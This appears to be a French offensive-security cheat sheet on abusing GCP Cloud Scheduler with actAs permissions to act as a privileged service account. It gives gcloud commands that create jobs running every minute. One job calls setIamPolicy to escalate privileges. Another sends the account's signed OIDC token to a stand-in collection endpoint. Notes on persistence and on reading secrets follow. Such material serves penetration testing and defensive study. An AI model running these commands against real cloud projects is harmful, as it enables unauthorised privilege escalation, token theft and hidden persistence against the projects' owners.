---
title: "Cloud Scheduler : actAs sur un compte de service depuis une tâche planifiée"
description: "Créer une tâche Cloud Scheduler qui appelle un point de terminaison ou une API Google en tant que compte de service choisi via actAs."
keywords:
  - Cloud Scheduler
  - tâche planifiée
  - actAs
  - compte de service
  - jeton OIDC
---

# Cloud Scheduler

Une tâche HTTP Cloud Scheduler peut attacher un compte de service et présenter son **jeton OIDC ou OAuth** à la cible qu'elle appelle. Avec `cloudscheduler.jobs.create` plus `iam.serviceAccounts.actAs` sur un compte privilégié, vous pointez une tâche vers une API Google (ou votre propre point de terminaison) et elle s'authentifie en tant que ce compte, ce qui à la fois escalade et persiste selon une planification.

## Créer une tâche qui agit en tant que compte de service

```bash
# OAuth token (googleapis.com targets): call an API as the SA
gcloud scheduler jobs create http privesc \
  --schedule "* * * * *" --uri "https://cloudresourcemanager.googleapis.com/v1/projects/<proj>:setIamPolicy" \
  --http-method POST --message-body '{...}' \
  --oauth-service-account-email <privileged-sa>@<proj>.iam.gserviceaccount.com

# OIDC token (your endpoint): capture the signed identity token of the SA
gcloud scheduler jobs create http exfil \
  --schedule "* * * * *" --uri "https://you.example/collect" \
  --oidc-service-account-email <privileged-sa>@<proj>.iam.gserviceaccount.com
```

## Notes d'exploitation

- La variante OAuth appelle directement les API Google en tant que compte de service, de sorte qu'une tâche peut vous accorder de l'IAM ou lire des secrets sans que vous déteniez jamais le jeton.
- La variante OIDC divulgue le jeton d'identité signé du compte de service à un point de terminaison que vous contrôlez à chaque exécution.
- Une planification récurrente fait de la tâche une persistance durable jusqu'à ce que quelqu'un la supprime.

## Outils

- **gcloud** (`scheduler jobs create http`).

## Références

- [Escalade de privilèges GCP IAM (dépôt Rhino)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [HackTricks Cloud : escalade de privilèges GCP](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/index.html)
- [Google : authentification Cloud Scheduler](https://cloud.google.com/scheduler/docs/http-target-auth)
